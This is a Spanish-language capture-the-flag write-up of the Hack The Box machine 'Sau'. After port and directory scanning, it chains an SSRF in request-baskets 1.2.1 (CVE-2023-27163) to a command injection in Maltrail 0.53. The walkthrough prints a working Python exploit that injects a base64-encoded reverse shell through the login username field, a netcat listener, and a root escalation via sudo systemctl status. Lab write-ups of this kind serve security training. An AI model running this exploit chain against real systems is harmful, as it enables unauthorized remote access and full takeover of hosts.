![Sau](https://github.com/n0m3l4c000nt35/Hack-The-Box/assets/149972189/77e7e778-4093-4e8a-b97d-b4d12e776667)

# Reconocimiento
---
## Escaneo de puertos

Iniciamos con un escaneo de puertos utilizando Nmap para identificar servicios y versiones en la máquina.

```bash
nmap -p- -sS -n -Pn --min-rate 5000 -vvv 10.10.11.224 -oG ports
```

El resultado nos muestra tres puertos abiertos: el puerto SSH (22), el puerto web (80) y un puerto desconocido (55555).

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 19:57 -03
Initiating SYN Stealth Scan at 19:57
Scanning 10.10.11.224 [65535 ports]
Discovered open port 22/tcp on 10.10.11.224
Increasing send delay for 10.10.11.224 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.224 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 55555/tcp on 10.10.11.224
Increasing send delay for 10.10.11.224 from 10 to 20 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.224 from 20 to 40 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.224 from 40 to 80 due to max_successful_tryno increase to 8
Completed SYN Stealth Scan at 19:58, 18.31s elapsed (65535 total ports)
Nmap scan report for 10.10.11.224
Host is up, received user-set (0.17s latency).
Scanned at 2023-12-22 19:57:57 -03 for 19s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.43 seconds
           Raw packets sent: 87544 (3.852MB) | Rcvd: 73984 (2.961MB)
```

Realizamos un escaneo detallado de los puertos identificados.

```bash
nmap -p 22,80,8338,55555 -sCV -n -Pn --min-rate 5000 10.10.11.224 -oN openPorts
```

El escaneo detallado nos proporciona información sobre los servicios en ejecución y sus versiones.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 19:59 -03
Nmap scan report for 10.10.11.224
Host is up (0.17s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 22 Dec 2023 23:00:34 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 22 Dec 2023 23:00:05 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 22 Dec 2023 23:00:06 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=12/22%Time=658614F6%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2022\x20Dec\x2
SF:02023\x2023:00:05\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/
SF:web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2022\x20Dec\x2
SF:02023\x2023:00:06\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nDate:\x20Fri,\x2022\x20Dec\x202023\x2023:00:34\x20GMT\
SF:r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20na
SF:me\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$
SF:\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.38 seconds
```

Adicionalmente, utilizamos herramientas como `whatweb` y `ffuf` para obtener más información sobre el servicio web en el puerto 55555.

```bash
whatweb http://10.10.11.224:55555/web

http://10.10.11.224:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.10.11.224], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

La herramienta `ffuf` nos ayuda a realizar una búsqueda de directorios en la URL.

```bash
ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.224:55555/FUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.224:55555/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# This work is licensed under the Creative Commons [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 157ms]
# directory-list-2.3-medium.txt [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 156ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 157ms]
# Copyright 2007 James Fisher [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 158ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 158ms]
#                       [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 158ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 159ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 161ms]
#                       [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 162ms]
# Priority ordered case-sensitive list, where entries were found [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 162ms]
#                       [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 164ms]
                        [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 165ms]
# on at least 2 different hosts [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 165ms]
#                       [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 178ms]
web                     [Status: 200, Size: 8700, Words: 1800, Lines: 230, Duration: 161ms]
test                    [Status: 200, Size: 7091, Words: 1916, Lines: 112, Duration: 158ms]
mars                    [Status: 200, Size: 7091, Words: 1916, Lines: 112, Duration: 167ms]
Web                     [Status: 301, Size: 39, Words: 3, Lines: 3, Duration: 155ms]
                        [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 161ms]
WEB                     [Status: 301, Size: 39, Words: 3, Lines: 3, Duration: 157ms]
```

Al visitar la URL [http://10.10.11.224:55555/web](http://10.10.11.224:55555/web), descubrimos que la aplicación se llama "[request-baskets](https://rbaskets.in/web)" y está en la versión 1.2.1.

```
Powered by request-baskets | Version: 1.2.1 
```

# Explotación
---
La versión 1.2.1 de request-baskets es vulnerable a un Server Side Request Forgery (SSRF) identificado por el [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163).

Para explotar la vulnerabilidad creamos una basket, modificamos la "Configuration Settings"

```
Forward URL: http://127.0.0.1:80
Proxy Response: true
```

Creamos una request

```bash
http://10.10.11.224:55555/<basket-name>
```

Ingresamos a la URL de la basket creada `http://<target-ip>:<port>/<basket>`, lo que nos redirige a la web en ejecución en el localhost del servidor en el puerto 80. Nos encontramos la aplicación [Maltrail](https://github.com/stamparm/maltrail/blob/master/README.md) en la versión 0.53, la cual es vulnerable a una ejecución remota de comandos.

```
Powered by Maltrail (v0.53)
```

Creamos un script con Python para ganar acceso al sistema

exploit.py
```python
import sys
import os
import base64
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="Remote Code Execution - Maltrail v0.53")
    parser.add_argument("-lh", "--lhost", dest="lhost", help="Attacker IP (Ex: -lh 192.168.0.100)", required=True)
    parser.add_argument("-lp", "--lport", dest="lport", help="Listening port (Ex: -lport 1234)", required=True)
    parser.add_argument("-u", "--url", dest="url", help="Target URL (Ex: --url http://10.10.10.10:44444/rn2tm9i", required=True)
    args = parser.parse_args()
    return args.lhost, args.lport, args.url

def exec_cmd(lhost, lport, target_url):
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1)
;os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    encoded_payload = base64.b64encode(payload.encode()).decode()
    command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    os.system(command)

def main():
    lhost, lport, url = get_arguments()
    try:
        exec_cmd(lhost, lport, url)
        print("\n[+] Connection established")
    except:
        print("\n[!] Something went wrong. Try again..")

if __name__ == "__main__":
    main()
```

Nos ponemos en escucha en la máquina atacante por un puerto a elección

```bash
nc -lnvp <puerto-en-escucha>
```

Ejecutamos el exploit pasandole nuestra ip de atacante, el puerto por el que estamos en escucha y la url de la basket creada con la configuración modificada para redireccionarnos al localhost del servidor

```bash
python3 exploit.py <ip-atacante> <puerto-en-escucha> http://<ip-victima>:55555/<basket>
```

Para obtener un control total de la consola, realizamos el tratamiento de la TTY.

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

## User flag
La user flag la encontramos en el directorio `/home/puma/`

```bash
cat /home/puma/user.txt
```

# Escalada de privilegios
---
Listamos los privilegios del usuario actual.

```bash
sudo -l
```

El resultado muestra que el usuario puma puede ejecutar `sudo /usr/bin/systemctl status trail.service` sin necesidad de contraseña.

```bash
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

En la página [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#sudo) se indica que mediante la ejecución de `systemctl` como `sudo` podemos escalar privilegios de la siguiente manera:

```bash
sudo /usr/bin/systemctl status trail.service
!sh
```

## Root flag
La root flag la encontramos en el directorio `/root/`

```bash
cat /root/root.txt
```
